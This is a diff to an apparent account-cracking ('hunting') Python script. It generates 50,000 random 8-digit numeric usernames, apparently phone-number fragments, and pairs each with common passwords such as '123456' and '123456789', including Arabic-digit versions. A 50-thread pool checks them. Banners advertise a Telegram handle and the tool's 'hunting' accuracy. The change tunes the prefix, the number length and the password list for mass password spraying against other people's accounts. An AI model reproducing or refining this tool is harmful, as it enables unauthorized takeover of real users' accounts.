@@ -143,10 +143,10 @@ def i():
     print('\033[1;31m[\033[1;37m+\033[1;31m] \033[1;32mTEL = nader20090')
     print('')
     print('\033[1;31m●\033[1;32m○\033[1;33m●'*21)
-    code = '100000'
+    code = '6'
     limit = 50000
     for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(9))
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
     os.system("clear")
 
@@ -154,6 +154,9 @@ def i():
     HamiiID = []
     for bilal in range(passx):
         pww = '123456'
+        pww = '123456789'
+        pww = '١٢٣٤٥٦'
+        pww = '١٢٣٤٥٦٧٨٩'
         HamiiID.append(pww)
     with ThreadPool(max_workers=50) as manshera:
         clear()
@@ -164,7 +167,8 @@ def i():
         print('')
         print('\033[1;31m[\033[1;37m+\033[1;31m]\033[1;32m LIMIT = 50000')
         print('\033[1;31m[\033[1;37m+\033[1;31m] \033[1;32mTEL = nader20090')
-        print('')
+        print('\033[1;32mFAS 2009 : اداه صيد 2009')
+        print('\033[1;32mwit : الاداه دقيقه في الفحص يرجى انتضار الصيد ...')
         print('\033[1;31m●\033[1;32m○\033[1;33m●'*21)
         for love in user:
             pwx = [love[1:]]
